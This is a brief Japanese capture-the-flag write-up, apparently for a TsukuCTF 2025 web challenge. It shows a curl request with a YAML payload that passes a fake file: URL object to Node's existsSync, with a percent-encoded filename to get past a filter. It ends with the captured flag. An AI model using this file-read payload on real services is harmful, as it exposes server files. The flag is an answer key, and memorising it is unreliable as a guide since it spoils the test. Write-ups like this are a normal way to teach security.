yaml.loadかjavascriptの脆弱性か？

existsSyncはPathLike=str|URL|Bufferで受け取るからfileをobjectにしてURLと認識させる

```bash
curl -X POST "http://20.2.250.108:50001" -H "Content-Type: text/plain" -d $'file:\n href: a\n protocol: "file:"\n hostname: ""\n pathname: fl%61g.txt\n origin: "file"'
```

きたーーーーーー

`TsukuCTF25{YAML_1s_d33p!}`
